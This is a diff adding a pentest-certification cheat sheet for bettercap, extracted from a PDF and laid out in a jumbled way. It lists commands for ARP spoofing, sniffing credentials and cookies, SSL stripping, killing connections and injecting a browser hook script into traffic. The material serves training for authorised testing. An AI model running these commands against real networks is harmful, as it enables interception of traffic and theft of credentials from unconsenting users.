@@ -1,0 +1,168 @@
+Certified Penetration Testing Professional Exam 412-80
+bettercap Cheat Sheet
+Certified Penetration Testing Professional
+bettercap Cheat Sheet
+bettercap
+Source: https://www.bettercap.org
+bettercap is a powerful, flexible, and portable tool and acts as a Swiss Army knife for Wi-Fi,
+Bluetooth Low Energy, wireless HID hijacking, and Ethernet network reconnaissance and MITM
+attacks. It can manipulate HTTP, HTTPS and TCP traffic in real-time to sniff the credentials
+1. bettercap Options
+2. Basic Module Commands
+3. bettercap Commands
+1. bettercap Options
+Syntax
+bettercap [Options]
+Options
+-h Get options
+Comma separated list of modules to auto start. (default
+-autostart string
+"events.stream, net.recon")
+Read commands from this file and execute them in the
+-caplet <file>
+interactive session
+-cpu-profile <file> Write CPU profile file
+-debug Print debug messages
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+bettercap Cheat Sheet
+Load environment variables from this file if found, set to
+-env-file <file>
+empty to disable environment persistence
+-eval Run one or more commands separated by ; in the interactive
+<command1;command2> session, used to set variables via command line
+-iface <interface> Specify the network interface that bettercap should bind to
+-mem-profile <file> Write memory profile to file
+-no-colors Disable output color effects
+-no-history Disable interactive session history file
+-silent Suppress all logs which are not errors
+-version Print the version and exit
+GUI Options
+-C Use a curses GUI
+-D Disable the GUI (daemon mode)
+Sniffing Options
+-X Enable Sniffer mode
+-L Sniff one’s own host also and others
+--sniffer-source
+Specifies a FILE that you consume
+<File>
+--sniffer-output
+Specifies a FILE that you write to
+<File>
+--sniffer-filter Specify a Berkeley Packet Filter (BPF) expression to filter
+EXPRESSION packets captured by the sniffer module
+List of parsers to use (COOKIE, CREDITCARD, DHCP, DICT, FTP,
+-P <parser1,
+HTTPAUTH, HTTPS, IRC, MAIL, MPD, MYSQL, NNTP, NTLMMS,
+parser2,...>
+PGSWL, POST, REDIS, RLOGIN, SNMP, SNPP, URL, WHATSAPP)
+Spoofing Options
+-S Spoof using ARP, ICMP, NONE
+--kill Kills connections for any current targets
+--half-duplex Works when the router is not MiTMable
+Logging Options
+--log <file> Log the output to somewhere
+--silent Log the output with no terminal display
+--log-timestamp Add a timestamp to logs
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+bettercap Cheat Sheet
+2. Basic Module Commands
+Command Description
+events.stream on Start the events stream.
+events.stream off Stop the events stream.
+events.show LIMIT? Show the events stream (LIMIT is an optional parameter)
+events.ignore FILTER Events with an identifier matching this filter will not be shown
+Used to remove filters passed with the events.ignore
+events.include FILTER
+command
+Clear the list of filters passed with
+events.filters.clear
+the events.ignore command
+events.clear Clear the events stream buffer
+events.waitfor TAG Wait for an event with the given tag either forever or for a
+TIMEOUT? timeout in seconds
+events.on TAG Define a new “trigger” that will run COMMANDS when an
+COMMANDS event with the specified TAG is triggered
+Show the list of event triggers created by
+events.triggers
+the events.on command
+events.trigger.delete
+Remove an event trigger given its TRIGGER_ID
+TRIGGER_ID
+events.triggers.clear Remove all event triggers
+ticker on Start the ticker
+ticker off Stop the ticker
+caplets.show Show a list of installed caplets
+caplets.paths Show a list caplet search paths
+caplets.update Install/updates the caplets
+3. bettercap Commands
+Command Description
+bettercap -X --no-spoofing Disable spoofing, cannot see one’s own traffic
+sudo bettercap Default settings, spoofing but no decoding
+bettercap -X Enable sniffer
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+bettercap Cheat Sheet
+bettercap -XP HTTPS MiTM looking for HTTPS
+bettercap -–log LOG_FILE Basic logging
+bettercap -–log LOG_FILE -–silent Silent logging
+bettercap –proxy-module –js-url Proxying: bettercap cannot just intercept
+http://192.168.10.25:3100/hook.js traffic but can interact with it
+sudo bettercap -eval To download and update caplets and web UI
+"caplets.update; ui.update; q" from the latest GitHub releases
+sudo bettercap -caplet http-ui To run both bettercap and the web UI
+To run bettercap on another host and to
+sudo bettercap -caplet https-ui connect to the UI and the API to be protected
+by TLS
+sudo bettercap -eval "set
+Set the arp.spoof.targets parameter and
+arp.spoof.targets 192.168.1.20;
+enable the arp.spoof module
+arp.spoof on"
+sudo bettercap -eval "help To quickly get the help menu of a module and
+net.recon; q" quit bettercap
+read arp.spoof.targets "Select
+To fill the arp.spoof.targets parameter
+the target to spoof: "
+Set the alias “MY IPAD” to the device with
+alias DE:AD:DE:AD:BE:EF MY IPAD
+MAC address DE:AD:DE:AD:BE:EF
+sudo bettercap -eval "set
+Start bettercap with full date and time format
+events.stream.time.format Mon Jan
+for events
+2 15:04:05 -0700 MST 2006"
+sudo bettercap -no-colors -eval Start bettercap without colors and terminal
+"set events.stream.output effects and write events to the file
+~/bettercap-events.log"
+~/bettercap-events.log
+sudo bettercap -iface eth0 -eval
+Run bettercap using eth0 as the main
+"set wifi.interface wlan0;
+interface but start the wifi module on wlan0
+wifi.recon on"
+sudo bettercap -T
+Attack specific target with its IP address
+192.168.1.10,192.168.1.11
+sudo bettercap -T
+Attack a specific target by its MAC address
+01:23:45:67:89:10
+sudo bettercap -T 192.168.1.1-30 Attack a range of IP addresses
+sudo bettercap -T 192.168.1.1/24 Attack a specific subnet
+Randomize the interface MAC address during the
+sudo bettercap --random-mac
+attack
+Page | 4 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+bettercap Cheat Sheet
+sudo bettercap -T 192.168.1.2 --
+Kill connections for a specific target
+kill
+sudo bettercap --no-sslstrip Disable SSL stripping and HSTS bypass
+Page | 5 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
